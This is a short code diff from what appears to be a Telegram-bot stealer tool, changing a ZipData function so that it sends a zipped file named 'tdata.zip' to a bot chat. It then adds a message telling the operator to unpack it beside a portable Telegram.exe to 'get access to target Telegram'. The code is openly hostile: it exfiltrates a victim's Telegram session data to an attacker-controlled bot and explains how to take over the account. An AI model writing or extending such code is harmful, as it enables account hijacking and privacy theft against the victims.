@@ -52,7 +52,13 @@ function ZipData(chat_id) {
     bot.api.sendMessage(chat_id, "Files are being sent");
     try {
       bot.api
-        .sendDocument(chat_id, new InputFile(filename, "data.zip"))
+        .sendDocument(chat_id, new InputFile(filename, "tdata.zip"))
+        .then(() => {
+          bot.api.sendMessage(
+            chat_id,
+            "Now extract the tdata.zip file and put Telegram.exe portable file in the directory.\nRun the Telegram, you should be able to get access to target Telegram."
+          );
+        })
         .catch((e) => {
           bot.api.sendMessage(chat_id, "Something went wrong!");
         });
